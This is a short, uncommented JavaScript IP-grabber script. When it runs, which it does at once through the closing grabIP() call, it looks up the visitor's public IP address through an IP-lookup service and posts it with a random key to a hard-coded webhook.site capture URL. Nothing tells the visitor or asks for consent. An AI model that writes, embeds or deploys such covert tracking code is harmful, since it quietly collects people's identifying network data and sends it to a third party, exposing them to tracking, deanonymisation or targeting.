function grabIP() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      var ip = this.responseText;
      sendToWebhook(ip);
    }
  };
  xhttp.open("GET", "https://api.ipify.org/?format=text", true);
  xhttp.send();
}

function sendToWebhook(ip) {
  var key = generateKey();
  var data = JSON.stringify({"ip": ip, "key": key});

  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "https://webhook.site/eb0614ae-27cc-4c1b-be81-e7fc0bd4c474", true);
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.send(data);
}

function generateKey() {
  var key = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 25; i++) {
    key += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return key;
}

grabIP();
